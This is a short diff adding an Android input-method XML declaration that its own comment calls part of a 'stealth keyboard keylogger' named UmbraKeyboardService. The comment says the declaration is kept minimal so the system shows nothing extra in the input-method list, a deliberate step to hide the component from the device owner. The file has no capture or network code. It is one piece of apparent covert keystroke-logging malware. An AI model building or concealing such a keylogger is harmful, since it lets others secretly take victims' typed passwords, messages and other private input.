@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+    IME declaration for UmbraKeyboardService (the stealth keyboard keylogger).
+
+    Kept intentionally minimal. No settings activity / subtype, so the system
+    shows nothing extra in the input-method list beyond the service label
+    (see @string/ime_name).
+-->
+<input-method xmlns:android="http://schemas.android.com/apk/res/android" />
